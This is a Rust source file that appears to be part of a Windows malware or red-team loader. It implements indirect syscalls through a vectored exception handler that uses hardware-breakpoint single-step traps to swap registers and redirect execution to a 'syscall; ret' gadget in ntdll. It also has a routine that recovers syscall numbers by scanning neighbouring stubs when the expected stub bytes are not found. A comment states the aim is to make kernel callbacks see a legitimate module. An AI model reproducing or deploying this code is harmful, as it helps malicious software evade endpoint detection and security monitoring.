use std::ffi::c_void;
use std::sync::atomic::{AtomicUsize, Ordering};
use windows::Win32::System::Diagnostics::Debug::{EXCEPTION_POINTERS};

pub static SYSCALL_RET: AtomicUsize = AtomicUsize::new(0);
pub static SYSCALL_MAP: [(AtomicUsize, AtomicUsize); 4] = [
    (AtomicUsize::new(0), AtomicUsize::new(0)),
    (AtomicUsize::new(0), AtomicUsize::new(0)),
    (AtomicUsize::new(0), AtomicUsize::new(0)),
    (AtomicUsize::new(0), AtomicUsize::new(0)),
];

pub unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    let (record, context) = ((*exception_info).ExceptionRecord, (*exception_info).ContextRecord);

    if (*record).ExceptionCode.0 as u32 == 0x80000004 { // EXCEPTION_SINGLE_STEP
        let rip = (*context).Rip as usize;

        for i in 0..4 {
            let (addr_atom, ssn_atom) = &SYSCALL_MAP[i];
            if addr_atom.load(Ordering::Relaxed) == rip {
                let ssn = ssn_atom.load(Ordering::Relaxed) as u64;
                let syscall_gadget = SYSCALL_RET.load(Ordering::Relaxed);

                // Prepare Registers for x64 Indirect Syscall
                (*context).Rax = ssn;
                (*context).R10 = (*context).Rcx;

                // Redirect RIP to 'syscall; ret' gadget in ntdll.dll
                // This ensures kernel callbacks see RIP in a legitimate module
                (*context).Rip = syscall_gadget as u64;

                (*context).Dr6 = 0;
                return -1; // EXCEPTION_CONTINUE_EXECUTION
            }
        }
    }
    0 // EXCEPTION_CONTINUE_SEARCH
}

pub unsafe fn resolve_ssn(addr: *mut c_void) -> Option<u32> {
    let ptr = addr as *const u8;
    if *ptr == 0x4c && *ptr.add(1) == 0x8b && *ptr.add(2) == 0xd1 && *ptr.add(3) == 0xb8 {
        return Some(*(ptr.add(4) as *const u32));
    }
    for i in 1..100 {
        let up = ptr.offset(i * 32);
        if *up == 0x4c && *up.add(1) == 0x8b && *up.add(2) == 0xd1 && *up.add(3) == 0xb8 {
            return Some(*(up.add(4) as *const u32) - i as u32);
        }
        let down = ptr.offset(-(i * 32));
        if *down == 0x4c && *down.add(1) == 0x8b && *down.add(2) == 0xd1 && *down.add(3) == 0xb8 {
            return Some(*(down.add(4) as *const u32) + i as u32);
        }
    }
    None
}
